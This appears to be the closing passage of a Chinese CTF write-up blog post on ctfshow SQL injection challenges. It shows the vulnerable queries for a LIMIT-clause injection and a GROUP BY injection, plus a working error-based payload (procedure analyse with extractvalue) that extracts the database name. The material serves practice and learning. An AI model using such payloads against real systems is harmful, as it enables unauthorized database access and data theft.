<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 分页查询</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">//TODO: 很安全，不需要过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 拿到数据库名字就算你赢</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vc3FsLWluamVjdGlvbnMtaW4tbXlzcWwtbGltaXQtY2xhdXNlLmh0bWw=">Mysql 下 Limit 注入方法</span></p>
<pre><code>考察limit注入的方式，在后面插入 procedure analyse(1,1)。
</code></pre>
<p>payload</p>
<pre><code>?page=1&amp;limit=1 procedure analyse(extractvalue(1,concat(0x7e,database(),0x7e)),1)
</code></pre>
<h4 id="web-222-group-by注入"><a class="anchor" href="#web-222-group-by注入">#</a> web 222 group by 注入</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 分页查询</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">//TODO: 很安全，不需要过滤</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE0MDYxNi5odG1s">https://www.secpulse.com/archives/140616.html</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGRhbnMvcC81NDEyNDY4Lmh0bWw=">https://www.cnblogs.com/xdans/p/5412468.html</span></p>
<pre><code>
</code></pre>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-05-06 15:47:02" itemprop="dateModified" datetime="2022-05-06T15:47:02+08:00">2022-05-06</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="Sirius WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="Sirius Alipay">
        <p>Alipay</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>Sirius <i class="ic i-at"><em>@</em></i>不积跬步，无以至千里；不积小流，无以成江海。——荀子
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="https://siriu0s.github.io/2022/05/06/ctfshow-SQL%E6%B3%A8%E5%85%A5/" title="ctfshow SQL注入">https://siriu0s.github.io/2022/05/06/ctfshow-SQL注入/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
    </div>
    <div class="item right">
      

  <a href="/2022/05/06/ctf/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhnx9glj20zk0m8npd.jpg" title="ctf">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>ctf</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#web-171-sql%E5%BC%80%E5%A7%8B"><span class="toc-number">1.</span> <span class="toc-text"> web 171-sql 开始</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-172-%E6%97%A0%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A52"><span class="toc-number">2.</span> <span class="toc-text"> web 172 无过滤注入 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-173-%E6%97%A0%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A53"><span class="toc-number">3.</span> <span class="toc-text"> web 173 无过滤注入 3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-174-%E6%97%A0%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A54-%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text"> web 174 无过滤注入 4 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-175-%E6%97%A0%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A55-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text"> web 175 无过滤注入 5 时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-176-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E5%A4%A7%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text"> web 176 过滤注入 大写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-177-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">7.</span> <span class="toc-text"> web 177 过滤注入 空格过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-178-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-number">8.</span> <span class="toc-text"> web 178 过滤注入 注释符过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-179-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A42"><span class="toc-number">9.</span> <span class="toc-text"> web 179 过滤注入 空格过滤 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-180-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E8%BF%90%E7%AE%97%E7%BA%A7andor"><span class="toc-number">10.</span> <span class="toc-text"> web 180 过滤注入 运算级 and&gt;or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-181-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E8%BF%90%E7%AE%97%E7%BA%A7andor"><span class="toc-number">11.</span> <span class="toc-text"> web 181 过滤注入 运算级 and&gt;or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-182-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E8%BF%90%E7%AE%97%E7%BA%A7andor"><span class="toc-number">12.</span> <span class="toc-text"> web 182 过滤注入 运算级 and&gt;or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-183-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">13.</span> <span class="toc-text"> web 183 过滤注入 - 布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-184-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-where%E8%BF%87%E6%BB%A4"><span class="toc-number">14.</span> <span class="toc-text"> web 184 过滤注入 - 布尔盲注 - where 过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-185-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%A4%9F%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">15.</span> <span class="toc-text"> web 185 过滤注入 - 布尔盲注 - 够造数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-186-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%972"><span class="toc-number">16.</span> <span class="toc-text"> web 186 过滤注入 - 布尔盲注 - 构造数字 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-187-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-md5passtrue%E7%BB%95%E8%BF%87"><span class="toc-number">17.</span> <span class="toc-text"> web 187 过滤注入 - md5 ($pass,true) 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-188-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-mysql%E7%9A%84%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">18.</span> <span class="toc-text"> web 188 过滤注入 - MYSQL 的弱比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-189-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-load_file%E7%BB%93%E5%90%88regexp%E7%9B%B2%E6%B3%A8"><span class="toc-number">19.</span> <span class="toc-text"> web 189 过滤注入 - load_file 结合 regexp 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-190-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5-bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">20.</span> <span class="toc-text"> web 190 过滤注入 - bool 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web201-sqlmap-agentreferer"><span class="toc-number">21.</span> <span class="toc-text"> web201 sqlmap agent,referer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web202-sqlmap-data"><span class="toc-number">22.</span> <span class="toc-text"> web202 sqlmap --data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web203-sqlmap-method"><span class="toc-number">23.</span> <span class="toc-text"> web203 sqlmap --method</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web204-sqlmap-cookie"><span class="toc-number">24.</span> <span class="toc-text"> web204 sqlmap --cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web205-sqlmap-api%E9%89%B4%E6%9D%83"><span class="toc-number">25.</span> <span class="toc-text"> web205 sqlmap api 鉴权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web206-sqlmap-sql%E9%97%AD%E5%90%88"><span class="toc-number">26.</span> <span class="toc-text"> web206 sqlmap sql 闭合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web207-sqlmap-tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">27.</span> <span class="toc-text"> web207 sqlmap tamper 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web208-sqlmap-tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">28.</span> <span class="toc-text"> web208 sqlmap tamper 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web209-sqlmap-tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">29.</span> <span class="toc-text"> web209 sqlmap tamper 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web210-sqlmap-tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">30.</span> <span class="toc-text"> web210 sqlmap tamper 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web211-sqlmap%E7%9A%84-tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">31.</span> <span class="toc-text"> web211 sqlmap 的 tamper 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web212-sqlmap%E7%9A%84-tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">32.</span> <span class="toc-text"> web212 sqlmap 的 tamper 使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web213-sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8-os-shell"><span class="toc-number">33.</span> <span class="toc-text"> web213 sqlmap 的使用 --os-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-214-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">34.</span> <span class="toc-text"> web 214 时间盲注 — 寻找注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-215-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E9%97%AD%E5%90%88%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">35.</span> <span class="toc-text"> web 215 时间盲注 — 闭合单引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-216-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8A%A0%E5%AF%86"><span class="toc-number">36.</span> <span class="toc-text"> web 216 时间盲注 — 注入点加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-217-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8benchmark"><span class="toc-number">37.</span> <span class="toc-text"> web 217 时间盲注 —benchmark</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-218-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="toc-number">38.</span> <span class="toc-text"> web 218 时间盲注 — 笛卡尔积</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-219-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="toc-number">39.</span> <span class="toc-text"> web 219 时间盲注 — 笛卡尔积</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-220-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-left"><span class="toc-number">40.</span> <span class="toc-text"> web 220 时间盲注 - left</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-221-limit%E6%B3%A8%E5%85%A5"><span class="toc-number">41.</span> <span class="toc-text"> web 221 limit 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-222-group-by%E6%B3%A8%E5%85%A5"><span class="toc-number">42.</span> <span class="toc-text"> web 222 group by 注入</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="Sirius"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">Sirius</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">2</span>
        <span class="name">posts</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Npcml1MHM=" title="https:&#x2F;&#x2F;github.com&#x2F;Siriu0s"><i class="ic i-github"></i></span>
      <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS9zdW4tY2h1bi15YW5nLTkx" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;sun-chun-yang-91"><i class="ic i-zhihu"></i></span>
      <span class="exturl item about" data-url="aHR0cHM6Ly9hYm91dC5tZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;about.me&#x2F;yourname"><i class="ic i-address-card"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOnlvdXJuYW1lQG1haWwuY29t" title="mailto:yourname@mail.com"><i class="ic i-envelope"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
  </li>

    
  <li class="item">
    <a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a>
  </li>

    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/06/ctf/" title="ctf">ctf</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/06/ctfshow-SQL%E6%B3%A8%E5%85%A5/" title="ctfshow SQL注入">ctfshow SQL注入</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Sirius @ Sirius's blog</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">35k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">32 mins.</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/05/06/ctfshow-SQL注入/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
